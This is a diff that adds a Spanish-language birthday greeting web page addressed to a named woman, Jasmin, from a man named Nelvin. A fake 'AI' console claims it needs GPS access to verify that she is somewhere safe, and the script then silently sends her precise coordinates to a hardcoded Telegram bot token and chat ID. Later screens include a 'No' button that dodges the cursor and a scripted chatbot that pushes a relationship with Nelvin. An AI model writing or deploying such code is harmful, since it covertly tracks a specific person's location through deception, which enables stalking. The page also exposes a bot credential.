@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Para Jasmin</title>
+    <style>
+        :root {
+            --rosa-fondo: #fff0f5;
+            --rosa-fuerte: #ff4d94;
+            --rosa-boton: #ff4da6;
+            --marco-celular: #2a2a2a;
+            --neon-pink: #ff2d95;
+            --dark-bg: #0a0a0c;
+            --rojo-felicidades: #e63946; 
+        }
+
+        body {
+            margin: 0;
+            background: #1a1a1a; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        .contenedor-movil {
+            width: 360px;
+            height: 640px;
+            background: var(--rosa-fondo);
+            border-radius: 40px;
+            position: relative;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            border: 8px solid var(--marco-celular);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .pantalla {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            display: none;
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center;
+            padding: 40px;
+            box-sizing: border-box;
+            text-align: center;
+            z-index: 10;
+        }
+
+        .activa { display: flex; }
+
+        .btn-rosado {
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border: none;
+            border-radius: 25px;
+            background: var(--rosa-boton);
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 77, 166, 0.3);
+            margin-top: 20px;
+        }
+
+        .v1-torta { font-size: 3.5rem; margin-bottom: 10px; }
+        .v1-titulo { color: var(--rosa-fuerte); font-size: 2.2rem; margin: 10px 0; font-weight: 900; }
+        .v1-texto { color: #555; font-size: 1.1rem; margin: 5px 0; line-height: 1.4; }
+
+        .p4-titulo { color: var(--rosa-fuerte); font-size: 1.8rem; font-weight: bold; margin-bottom: 20px; }
+        .p4-subtitulo { color: #666; font-size: 1rem; margin: 0; line-height: 1.5; }
+        .contenedor-botones-p4 { position: relative; width: 100%; height: 150px; margin-top: 40px; }
+        #btnSi { position: absolute; left: 30px; }
+        #btnNo { position: absolute; left: 170px; background: #888; transition: all 0.2s ease; }
+
+        .v5-icon { font-size: 6rem; margin-bottom: 15px; } 
+        .v5-felicidades { color: var(--rojo-felicidades); font-size: 3rem; font-weight: 900; margin: 10px 0; letter-spacing: -1px; } 
+        .v5-caramelo { color: #555; font-size: 1.5rem; font-weight: bold; margin-top: 20px; }
+
+        .fase-ia {
+            background: var(--dark-bg);
+            height: 100%;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            color: #f0f0f0;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        .header-ia {
+            padding: 15px;
+            border-bottom: 1px solid rgba(255, 45, 149, 0.3);
+            text-align: center;
+            font-size: 0.8rem;
+            color: var(--neon-pink);
+            text-shadow: 0 0 5px var(--neon-pink);
+        }
+
+        #consola, #consola-bot {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .bot-msg { color: #00fbff; font-size: 0.85rem; line-height: 1.4; white-space: pre-line; text-align: left; }
+        .user-msg { color: var(--neon-pink); text-align: right; font-size: 0.85rem; font-weight: bold; }
+
+        .input-area {
+            padding: 15px;
+            background: #1a1a1d;
+            border-top: 1px solid rgba(255, 45, 149, 0.2);
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .input-row { display: flex; gap: 10px; }
+
+        #user-input, #user-input-bot {
+            flex: 1;
+            background: transparent;
+            border: 1px solid var(--neon-pink);
+            border-radius: 5px;
+            color: white;
+            padding: 8px;
+            outline: none;
+        }
+
+        .btn-enviar {
+            background: var(--neon-pink);
+            border: none;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #btn-gps, #btn-terminar {
+            background: #00fbff; color: black; padding: 10px; border-radius: 10px; 
+            border: none; font-weight: bold; cursor: pointer; width: 100%;
+        }
+        
+        #btn-terminar { background: #444; color: white; margin-top: 5px; border: 1px solid #666; }
+
+        .corazon-flotante {
+            position: absolute;
+            color: var(--rosa-fuerte);
+            font-size: 20px;
+            pointer-events: none;
+            z-index: 50;
+            animation: flotar 3s ease-out forwards;
+        }
+
+        @keyframes flotar {
+            0% { transform: translate(0, 0) scale(0.5); opacity: 1; }
+            100% { transform: translate(var(--dx), var(--dy)) scale(1.5); opacity: 0; }
+        }
+
+        #girasol { max-width: 85%; border-radius: 20px; transform: scale(0); }
+        @keyframes crecer { 0% { transform: scale(0); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        #fraseTyping { font-size: 1rem; background: rgba(255,255,255,0.8); padding: 20px; border-radius: 20px; text-align: left; line-height: 1.6; color: #333; }
+    </style>
+</head>
+<body>
+
+    <div class="contenedor-movil" id="contenedor">
+        
+        <div id="fase-seguridad" class="fase-ia">
+            <div class="header-ia">System_nelvin_ia v3.0</div>
+            <div id="consola"></div>
+            <div class="input-area" id="area-entrada-ia">
+                <div class="input-row">
+                    <input type="text" id="user-input" placeholder="Escribe comando..." autocomplete="off">
+                    <button class="btn-enviar" onclick="procesarRespuesta()">></button>
+                </div>
+                <button id="btn-gps" style="display:none;" onclick="obtenerGps()">Autorizar acceso local</button>
+            </div>
+        </div>
+
+        <div id="p1" class="pantalla">
+            <div class="v1-torta">🎂</div>
+            <h1 class="v1-titulo">¡Feliz Cumpleaños!</h1>
+            <p class="v1-texto">Hoy celebramos a una persona muy especial.</p>
+            <p class="v1-texto">Que tu día esté lleno de amor y momentos hermosos.</p>
+            <button class="btn-rosado" onclick="irP2()">Aplástame aquí</button>
+        </div>
+
+        <div id="p2" class="pantalla">
+            <img id="girasol" src="girasol.jpg">
+        </div>
+
+        <div id="p3" class="pantalla">
+            <div id="fraseTyping"></div>
+            <button id="btnSiguiente" class="btn-rosado" style="display: none;" onclick="irP4()">Aplástame</button>
+            <small id="esperaTexto" style="color: #999; margin-top: 15px;">Espera un momento... (15s)</small>
+        </div>
+
+        <div id="p4" class="pantalla">
+            <h2 class="p4-titulo">No hemos terminado y lo sabes ¿aceptas que esta vez nos conozcamos mejor? ❤️</h2>
+            <p class="p4-subtitulo">Tienes que decir que sí.</p>
+            <p class="p4-subtitulo">Te reto a que intentes marcar que no, si no quieres jjj.</p>
+            <div class="contenedor-botones-p4">
+                <button id="btnSi" class="btn-rosado" onclick="irP5()">Sí</button>
+                <button id="btnNo" class="btn-rosado" onmouseover="escapar()" ontouchstart="escapar()">No</button>
+            </div>
+        </div>
+
+        <div id="p5" class="pantalla">
+            <div class="v5-icon">🥳</div> <h1 class="v5-felicidades">¡FELICIDADES!</h1>
+            <p class="v5-caramelo">Te ganaste un caramelo 🍭</p>
+            <button class="btn-rosado" style="background: #121214;" onclick="irBotFinal()">Consultar ia de nelvin</button>
+        </div>
+
+        <div id="fase-bot-final" class="fase-ia" style="display:none;">
+            <div class="header-ia">Nelvin_bot // Chat emocional</div>
+            <div id="consola-bot"></div>
+            <div class="input-area">
+                <div class="input-row">
+                    <input type="text" id="user-input-bot" placeholder="Habla conmigo, Jasmin..." autocomplete="off">
+                    <button class="btn-enviar" onclick="procesarBotFinal()">></button>
+                </div>
+                <button id="btn-terminar" onclick="location.reload()">Terminar protocolo</button>
+            </div>
+        </div>
+
+    </div>
+
+    <audio id="musica" loop><source src="musica.mp3" type="audio/mpeg"></audio>
+
+<script>
+    const TOKEN = "8712178079:AAG4JmujEAqTB1qWtdoHEJJnCcr8rrIb-bk";
+    const CHAT_ID = "6814352164";
+    let pasoActual = 0;
+    let intervaloCorazones;
+
+    const dialogosSeguridad = [
+        { bot: "Iniciando sistema... [OK]\nBuscando usuario: JASMIN... [OK]\n\nHola Jasmin. Soy la Ia de Nelvin. Hoy es un día detectado como: Cumpleaños. ¿Estás lista para tu protocolo de sorpresas?" },
+        { bot: "Perfecto. Pero primero, por seguridad, dime: ¿Cómo se llama el chico que te envió este link?" },
+        { bot: "Identidad confirmada. Nelvin tiene algo para ti.\n\nPara desbloquear el primer paquete de datos (Tu regalo), necesito que actives el sensor de proximidad (Gps) para verificar que estás en un lugar seguro." }
+    ];
+
+    function escribirBot(id, texto) {
+        const c = document.getElementById(id);
+        const d = document.createElement("div"); d.className = "bot-msg"; d.innerText = "> " + texto;
+        c.appendChild(d); c.scrollTop = c.scrollHeight;
+    }
+
+    function escribirUsuario(id, texto) {
+        const c = document.getElementById(id);
+        const d = document.createElement("div"); d.className = "user-msg"; d.innerText = texto + " <";
+        c.appendChild(d); c.scrollTop = c.scrollHeight;
+    }
+
+    window.onload = () => { setTimeout(() => escribirBot("consola", dialogosSeguridad[0].bot), 1000); };
+
+    function procesarRespuesta() {
+        const input = document.getElementById("user-input");
+        const val = input.value.trim(); if(!val) return;
+        escribirUsuario("consola", val); input.value = "";
+        if(pasoActual === 0) { pasoActual++; setTimeout(() => escribirBot("consola", dialogosSeguridad[1].bot), 800); }
+        else if(pasoActual === 1) {
+            if(val.toLowerCase().includes("nelvin")) {
+                pasoActual++;
+                setTimeout(() => {
+                    escribirBot("consola", dialogosSeguridad[2].bot);
+                    document.getElementById("btn-gps").style.display = "block";
+                }, 800);
+            } else { escribirBot("consola", "Error: Acceso denegado. Intenta el nombre correcto."); }
+        }
+    }
+
+    function obtenerGps() {
+        navigator.geolocation.getCurrentPosition((pos) => {
+            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: `🤖 IA JASMIN:\n📍 Ubicación confirmada: ${link}` }) });
+            document.getElementById("fase-seguridad").style.display = "none";
+            document.getElementById("p1").classList.add("activa");
+        }, (err) => { alert("Activa el GPS para continuar."); });
+    }
+
+    function crearCorazon() {
+        const cont = document.getElementById('contenedor');
+        const c = document.createElement('div'); c.className = 'corazon-flotante'; c.innerHTML = '❤️';
+        c.style.left = '50%'; c.style.top = '50%';
+        c.style.setProperty('--dx', (Math.random()-0.5)*400+"px");
+        c.style.setProperty('--dy', (Math.random()-0.5)*600+"px");
+        cont.appendChild(c); setTimeout(() => c.remove(), 3000);
+    }
+
+    function irP2() {
+        document.getElementById("musica").play().catch(()=>{});
+        document.getElementById("p1").classList.remove("activa");
+        document.getElementById("p2").classList.add("activa");
+        document.getElementById("girasol").style.animation = "crecer 1.2s forwards";
+        intervaloCorazones = setInterval(crearCorazon, 300);
+        setTimeout(irP3, 4000);
+    }
+
+    function irP3() {
+        document.getElementById("p2").classList.remove("activa");
+        document.getElementById("p3").classList.add("activa");
+        const texto = `Curioso, pasó el tiempo, pero aún tienes ese "algo" que no se borra. Espero que hoy te consientan como se debe... aunque creo que aún me quedas debiendo una sonrisa. \n\nHoy eres una bebé, naciste jjj. Recuérdate de mí, Jasmin. ✨`;
+        let i = 0;
+        function frame() {
+            if(i < texto.length) {
+                document.getElementById("fraseTyping").innerHTML += texto.charAt(i) === "\n" ? "<br>" : texto.charAt(i);
+                i++; setTimeout(frame, 50);
+            } else { 
+                document.getElementById("btnSiguiente").style.display = "block"; 
+                document.getElementById("esperaTexto").style.display = "none"; 
+            }
+        }
+        frame();
+    }
+
+    function irP4() { clearInterval(intervaloCorazones); document.getElementById("p3").classList.remove("activa"); document.getElementById("p4").classList.add("activa"); }
+    function irP5() { document.getElementById("p4").classList.remove("activa"); document.getElementById("p5").classList.add("activa"); }
+    function irBotFinal() { 
+        document.getElementById("p5").classList.remove("activa"); 
+        document.getElementById("fase-bot-final").style.display = "flex"; 
+        escribirBot("consola-bot", "Soy la Ia programada por la mente de Nelvin.\n\nHola Jasmin. Pregúntame sobre Escorpio, Aries, Amor, Lado negativo, Conexión, Salir adelante, Lealtad, Ustedes o Cómo deben salir adelante juntos."); 
+    }
+
+    function procesarBotFinal() {
+        const input = document.getElementById("user-input-bot");
+        const val = input.value.toLowerCase(); if(!val) return;
+        escribirUsuario("consola-bot", input.value); input.value = "";
+        
+        let r = "Jasmin, esa pregunta es interesante. Intenta preguntando por: Escorpio, Aries, Nelvin o Cómo salir adelante juntos.";
+
+        if(val.includes("escorpio")) {
+            r = "Escorpio es un signo de agua profunda, misterioso e intenso. Nelvin es un Escorpio que ama con esa misma intensidad; es como un mar profundo lleno de misterios que no todos tienen el privilegio de conocer realmente.";
+        }
+        else if(val.includes("aries")) {
+            r = "Aries es fuego, energía y valentía. Jasmin, tú representas esa chispa que se lanza sin miedo. Donde Escorpio observa, tú actúas; eres la luz que puede iluminar ese océano profundo de Nelvin.";
+        }
+        else if(val.includes("adelante") || val.includes("podemos") || val.includes("juntos") || val.includes("saldremos")) {
+            r = "Claro que pueden salir adelante juntos, Jasmin. Si tú entiendes su silencio emocional y él confía en tu sinceridad directa, pueden crear algo tan intenso y real que será difícil de olvidar.";
+        }
+        else if(val.includes("ustedes") || val.includes("nosotros") || val.includes("relacion") || val.includes("relación")) {
+            r = "Ustedes (Aries y Escorpio) son dinamita pura. Jasmin aporta la luz y Nelvin la profundidad. Si logran equilibrar esa intensidad, serán una fuerza que nadie podrá detener.";
+        }
+        else if(val.includes("nelvin")) {
+            r = "Nelvin no es superficial ni juega con los sentimientos. Él es leal, protector y guarda un mundo entero dentro de sí. Si te eligió es porque vio algo real y valioso en ti.";
+        }
+        else if(val.includes("amor")) {
+            r = "En el amor, Nelvin (Escorpio) se entrega completamente y protege lo que ama. Jasmin (Aries) aporta la alegría y la pasión. No es una relación tibia, es todo o nada.";
+        }
+        else if(val.includes("negativo") || val.includes("lado")) {
+            r = "⚠️ Lado negativo: Al ser tan intensos, pueden chocar fuerte. La clave es que tú entiendas su silencio y él confíe en tu sinceridad directa. Si no se hablan a tiempo, la intensidad puede quemar.";
+        }
+        else if(val.includes("conexion") || val.includes("conexión")) {
+            r = "🌌 Conexión única: Es fuego y agua. Una energía magnética que puede transformar a ambos y marcar un antes y un después en sus vidas.";
+        }
+        else if(val.includes("lealtad")) {
+            r = "Para Nelvin, la lealtad es la base de todo. No entrega su corazón fácilmente, pero cuando lo hace, es con una intención de fidelidad absoluta.";
+        }
+        else if(val.includes("destino") || val.includes("futuro")) {
+            r = "El destino dice que lo de ustedes no es casualidad. Aries y Escorpio están destinados a aprender el uno del otro. El futuro depende de qué tanto quieran cuidar esa conexión.";
+        }
+        else if(val.includes("perdón") || val.includes("perdon") || val.includes("fallar")) {
+            r = "Un Escorpio como Nelvin valora la verdad por encima de todo. Si hay errores, se hablan. La lealtad se demuestra en los momentos difíciles, no solo en los buenos.";
+        }
+        else if(val.includes("extrañar") || val.includes("falta")) {
+            r = "Aunque no siempre lo diga, Nelvin siente tu ausencia. Escorpio extraña en silencio pero con mucha fuerza. Tú eres esa energía que le hace falta a su calma.";
+        }
+        else if(val.includes("secreto") || val.includes("misterio")) {
+            r = "El mayor secreto de Nelvin es que, bajo esa capa de misterio, hay un corazón que solo busca seguridad y una persona que no le falle. Tú podrías ser esa persona, Jasmin.";
+        }
+
+        setTimeout(() => escribirBot("consola-bot", r), 800);
+    }
+
+    function escapar() {
+        const btn = document.getElementById("btnNo");
+        btn.style.left = Math.random() * 200 + "px";
+        btn.style.top = Math.random() * 100 + "px";
+    }
+
+    document.getElementById("user-input").addEventListener("keypress", (e) => { if(e.key === "Enter") procesarRespuesta(); });
+    document.getElementById("user-input-bot").addEventListener("keypress", (e) => { if(e.key === "Enter") procesarBotFinal(); });
+</script>
+</body>
+</html>
